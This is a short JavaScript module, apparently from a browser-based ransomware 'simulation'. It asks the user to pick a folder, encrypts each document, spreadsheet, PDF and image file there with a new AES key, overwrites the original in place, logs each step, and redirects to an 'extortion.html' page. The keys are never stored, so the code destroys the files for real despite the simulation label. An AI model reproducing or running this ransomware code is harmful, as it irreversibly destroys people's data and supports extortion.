import { generateAESKey, encryptFileBuffer } from "./encryption.js";

async function logAction(action) {
  try {
    await fetch("/api/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action, timestamp: new Date().toISOString() }),
    });
  } catch (err) {
    console.error("Logging failed:", err);
  }
}

export async function startSimulation() {
  try {
    if (!window.showDirectoryPicker) {
      throw new Error("File System Access API is not supported.");
    }

    const dirHandle = await window.showDirectoryPicker();
    await logAction(`Selected folder: ${dirHandle.name}`);

    const supportedFormats = [
      ".txt",
      ".docx",
      ".xlsx",
      ".pdf",
      ".jpeg",
      ".doc",
      ".xls",
    ];

    for await (const entry of dirHandle.values()) {
      if (entry.kind !== "file") continue;

      const fileName = entry.name.toLowerCase();
      if (!supportedFormats.some((ext) => fileName.endsWith(ext))) {
        await logAction(`Skipped unsupported file: ${entry.name}`);
        continue;
      }

      await logAction(`Reading file: ${entry.name}`);
      const file = await entry.getFile();
      const buffer = await file.arrayBuffer();

      const aesKey = await generateAESKey();
      const encryptedBuffer = await encryptFileBuffer(buffer, aesKey);

      // Overwrite original file in-place with encrypted content
      const writable = await entry.createWritable();
      await writable.write(encryptedBuffer);
      await writable.close();
      await logAction(`Encrypted in-place: ${entry.name}`);
    }

    await logAction("All files encrypted. Redirecting to extortion.html...");
    window.location.href = "extortion.html";
  } catch (err) {
    await logAction(`ERROR: ${err.message}`);
    throw err;
  }
}
